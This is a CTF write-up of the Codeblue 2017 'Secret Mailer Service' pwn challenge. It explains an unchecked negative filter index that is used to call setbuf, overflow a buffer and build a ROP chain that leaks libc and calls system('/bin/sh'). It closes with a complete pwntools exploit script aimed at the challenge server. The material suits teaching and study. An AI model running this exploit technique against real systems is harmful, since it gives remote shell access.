---
title: Codeblue CTF 2017 - Secret Mailer Service
date: '2017-11-11'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- writeup
- codeblue2017
tags:
- pwn
- rop
- overflow
- setbuf
authors:
- dp_1
---

For this challenge we're given the binary of a service, `mailer`. There are 5 letters allocated on the stack which we can work on, and every time a letter is referenced the code checks if the index is valid - no exploits there. The service allows us to write, delete and post letters, where posting a letter really means writing out its contents to `/dev/null` with the ability to use a filter. It's in the filter selection that we find our vulnerability:

```cpp
int post_letter(Letter *letters, FILE *s)
{
    int v3;
    int v4;

    puts("\nWhich letter do you want to post?");
    printf("ID (0-%d): ", 4);
    v4 = read_number();
    if ( v4 < 0 || v4 > 4 || !letters[v4].present )
        return puts("Invalid ID.");
    puts("\nWhich filter do you want to apply?");
    filter_menu();
    v3 = read_number();
    if ( v3 > 2 )
        return puts("Invalid filter.");
    filters[v3](s, letters[v4].data, letters[v4].length);
    return puts("\nDone!");
}
```

The filter id is only checked to be <= 2 and not >= 0. This allows us to input a negative number in there and, since the filters are implemented as a lookup table of function addresses, we can basically call whatever function we want, as long as the parameters are compatible. What I did was call the setbuf entry in plt by using index -15, thus setting the data of one of the filters as the buffer for `/dev/null`. The nice part here is that libc assumes this buffer to be at least 8192 bytes long, so by posting other letters we can overflow it.

Let's have a quick look at how a letter is saved in memory:

```cpp
00000000 Letter          struc ; (sizeof=0x108, mappedto_5)
00000000 present         dd ?
00000004 length          dd ?
00000008 data            db 256 dup(?)
00000108 Letter          ends
```

And at the stack of the main loop (please note this is the inverted stack layout used by ida, lower addresses are on top):

```cpp
-0000053C stream          dd ?                    ; /dev/null
-00000538 var_538         dd ?
-00000534 var_534         dd ?
-00000530 data            Letter 5 dup(?)
-00000008 var_8           dd ?
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

The logical thing to do now is overflow the buffer for the last letter, getting full control of the return address while leaving the other entries free for our use - remember that to overflow the buffer we have to post other letters' contents. Unfortunately, we still don't know any libc address, so that's what we're going to focus on next. I did it in a quite convoluted way, but a way I liked: I realized that we could return first to the `read_letter` function, whose role is to read a string into a buffer, and give it the address of some free memory area in order to write a format string there, and then call `printf` to leak a plt address. The end of this first step is returning back to the main loop, now knowing libc's base address.

For the second and last step, I used the same setbuf and read_letter calls, only this time providing `"/bin/sh"` instead of `"%s"` to the latter. Then the logical thing was to call `system` on the buffer, getting a shell on the remote server. A couple of commands later, I got this:
`CBCTF{4R3_YOU_w4RM3D_UP_f0R_MORE_PWNabLeS?}`

Hell, this one took me a long time to figure out and it was only meant to be a warmup?

---

This is the full exploit script:

```python
from pwn import *

def chunks(data, step):
	for i in range(0, len(data), step):
		yield data[i:min(i+step, len(data))]

def add_letter(r, letter):
	r.recvuntil('> ')
	r.sendline('1')
	r.recvuntil('Input your contents:')
	r.sendline(letter)

def delete_letter(r, letterid):
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil('(0-4):')
	r.sendline(str(letterid))

def post_letter(r, letterid, filterid):
	r.recvuntil('> ')
	r.sendline('3')
	r.recvuntil('(0-4):')
	r.sendline(str(letterid))
	r.recvuntil('> ')
	r.sendline(str(filterid))


libc = ELF('./libc.so.6')

r = remote('sms.tasks.ctf.codeblue.jp', 6029)
#r = process('./mailer')


### First step: obtain libc base address

buf_addr = 0x0804B040
p = 'A' * (256 + 12)

# write the format string using read_letter
p += p32(0x080486D9) # read_letter
p += p32(0x08048daa) #pop;pop;ret
p += p32(buf_addr)
p += p32(4)

# call printf("%s", plt.atoi)
p += p32(0x080484C0)
p += p32(0x08048daa) #pop;pop;ret
p += p32(buf_addr)
p += p32(0x0804B03C) # got address for atoi

# call main_loop once again
p += p32(0x08048BD0)

for i in range(5):
	add_letter(r, '')
delete_letter(r, 0)

# setbuf(/dev/null, letters[4].data)
post_letter(r, 4, -15)

for chunk in chunks(p, 200):
	print 'Chunk: ' + chunk
	add_letter(r, chunk)
	post_letter(r, 0, 0)
	delete_letter(r, 0)

r.sendline('4');
r.recvuntil(':)')
r.sendline('%s')
r.readline()
dump = r.readline()

atoi_addr = ord(dump[0]) + (ord(dump[1]) << 8) + (ord(dump[2]) << 16) + (ord(dump[3]) << 24)
print 'Atoi addr: 0x%x' % atoi_addr
libc_addr = atoi_addr - libc.symbols['atoi']
print 'Libc base: 0x%x' % libc_addr


### Second step: call system("/bin/sh")

p = 'A' * (256 + 12)

# write /bin/sh using read_letter
p += p32(0x080486D9) # read_letter
p += p32(0x08048daa) #pop;pop;ret
p += p32(buf_addr)
p += p32(16)

# call system("/bin/sh")
p += p32(libc_addr + libc.symbols['system'])
p += p32(0x08048dab) #pop:ret
p += p32(buf_addr)

# call fail
p += p32(0x0804868B)

for i in range(5):
	add_letter(r, '')
delete_letter(r, 0)

# setbuf(/dev/null, letters[4].data)
post_letter(r, 4, -15)

for chunk in chunks(p, 200):
	print 'Chunk: ' + chunk
	add_letter(r, chunk)
	post_letter(r, 0, 0)
	delete_letter(r, 0)

r.sendline('4')
r.recvuntil(':)')
r.sendline('/bin/sh')

r.interactive()

```
